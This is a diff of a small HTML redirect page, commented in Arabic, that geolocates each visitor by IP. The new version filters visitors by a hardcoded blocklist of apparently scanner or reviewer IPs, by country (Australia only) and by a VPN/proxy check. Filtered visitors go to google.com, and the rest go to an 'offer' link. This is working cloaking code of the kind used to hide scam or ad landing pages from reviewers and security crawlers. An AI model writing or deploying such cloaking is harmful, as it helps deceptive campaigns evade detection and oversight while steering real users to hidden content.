@@ -3,34 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>work</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <title>Check Access</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js"></script>
 
     <script>
-        // Define the allowed countries (ISO 3166-1 alpha-2 country codes)
-const allowedCountries = ['AU']; // Example: United States, Canada, United Kingdom
+        const allowedCountry = 'AU'; // السماح فقط لأستراليا
+        const proxyCheckAPI = "https://proxycheck.io/v2/";
+        
+        // قائمة الـ IPs المحظورة
+        const blockedIPs = [
+            "185.18.222.147",
+            "103.17.196.155",
+            "198.44.133.53",
+            "138.199.22.183",
+            "106.161.65.206",
+            "54.200.5.221",
+            "35.89.14.236",
+            "35.88.70.185"
+        ];
 
-$.get('https://ipinfo.io/json', function(data) {  
-    const ipAddress = data.ip;  // Extract the IP address  
-    const country = data.country;  // Extract the country code  
+        $.get('https://ipinfo.io/json', function(data) {  
+            const userIP = data.ip;
+            const userCountry = data.country;
 
-    console.log("IP Address:", ipAddress);  
-    console.log("Country:", country);  
+            console.log("User IP:", userIP);
+            console.log("User Country:", userCountry);
 
-    // Check if the country is in the allowed list  
-    if (allowedCountries.includes(country)) {    
-        console.log("Access allowed for country:", country);    
-        window.location.href = "https://www.rjbdsa2trk.com/3KDJCJS/52B5LNB/"; // رابط للمسموح لهم  
-    } else {    
-        console.log("Access denied for country:", country);    
-        window.location.href = "https://amazon.com"; // رابط لمنعهم  
-    }
-}).fail(function(error) {  
-    console.error('Error:', error);  
-});
+            if (blockedIPs.includes(userIP)) {
+                console.log("Access denied: IP is blacklisted");
+                window.location.href = "https://google.com"; // حظر الدخول
+                return;
+            }
+
+            if (userCountry !== allowedCountry) {
+                console.log("Access denied: Not from AU");
+                window.location.href = "https://google.com"; // منع الدخول
+                return;
+            }
+
+            // التحقق من VPN/Proxy
+            $.get(`${proxyCheckAPI}${userIP}?key=YOUR_API_KEY&vpn=1&asn=1`, function(response) {
+                if (response[userIP] && response[userIP].proxy === "yes") {
+                    console.log("Access denied: Proxy/VPN detected");
+                    window.location.href = "https://google.com";
+                } else {
+                    console.log("Access granted!");
+                    window.location.href = "https://ovh.com"; // العرض
+                }
+            });
+        }).fail(function(error) {  
+            console.error('Error:', error);
+        });
+
     </script>
 </head>
 <body>
-
 </body>
 </html>
